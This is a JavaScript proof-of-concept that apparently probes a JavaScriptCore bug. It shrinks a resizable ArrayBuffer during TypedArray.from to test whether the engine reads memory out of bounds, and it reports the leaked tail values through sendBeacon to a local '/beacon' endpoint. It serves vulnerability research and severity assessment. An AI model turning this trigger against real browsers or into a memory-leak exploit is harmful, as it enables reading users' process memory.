// c026b: TypedArray.from + resizable source. Two questions in one run:
//   (1) does the unfixed loop keep calling mapFn past the new length?  (source shape)
//   (2) does arrayLike[k] actually read out of bounds, or just return undefined?  (severity)
//
// Upstream's regression test (JSTests/stress/typedarray-from-oob.js) only asserts (1) via callback count.
// The bug is titled Out-of-Bounds Read, which implies the element access uses a cached vector+length - an
// IC/JIT property. This build is LLInt-only, so (2) is genuinely open and is the difference between an info
// leak and a spec deviation.
//
// Trigger shape taken from the shipped test: shadow @@iterator so from() takes the array-like branch while
// arrayLike is still a typed array view over a resizable buffer.
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c026b-' + LOG[i]); } catch (e) {} } }

  note('boot');
  var probe;
  try { probe = new ArrayBuffer(16, { maxByteLength: 64 }); } catch (e) { note('no-RAB:' + e.name); flush(); return; }
  if (typeof probe.resize !== 'function') { note('no-resize'); flush(); return; }
  note('rab-ok');

  function run(tag, ctor, bytesPerElement, initialBytes, shrinkBytes, resizeAt) {
    var newCount = shrinkBytes / bytesPerElement;
    var rab = new ArrayBuffer(initialBytes, { maxByteLength: initialBytes * 4 });
    var src = new ctor(rab);
    // fill with a recognisable non-zero pattern
    for (var i = 0; i < src.length; i++) src[i] = 0x41;
    src[Symbol.iterator] = null;

    var calls = 0, threw = '';
    var out;
    try {
      out = ctor.from(src, function (val, index) {
        if (index === resizeAt) rab.resize(shrinkBytes);
        calls++;
        return val;
      });
    } catch (e) { threw = e.name; }

    var expectedFixed = Math.max(resizeAt + 1, newCount);
    var tailNonZero = 0, tailZeros = 0, tailSample = [];
    if (out) {
      for (var k = newCount; k < out.length; k++) {
        if (out[k] !== 0) { tailNonZero++; if (tailSample.length < 5) tailSample.push(k + ':' + out[k]); }
        else tailZeros++;
      }
    }
    note(tag + ' calls=' + calls + ' expectedFixed<=' + expectedFixed +
         ' unfixedLoop=' + (calls > expectedFixed) +
         ' tailZero=' + tailZeros + ' tailNonZero=' + tailNonZero +
         (tailSample.length ? ' sample[' + tailSample.join(' ') + ']' : '') +
         (threw ? ' threw:' + threw : ''));
  }

  run('U8',  Uint8Array,  1, 1024, 4, 8);
  run('I32', Int32Array,  4, 4096, 16, 4);
  run('F64', Float64Array, 8, 8192, 32, 8);

  // variant: shrink to zero, the most aggressive case
  run('I32Z', Int32Array, 4, 4096, 0, 0);

  note('done');
  flush();
})();
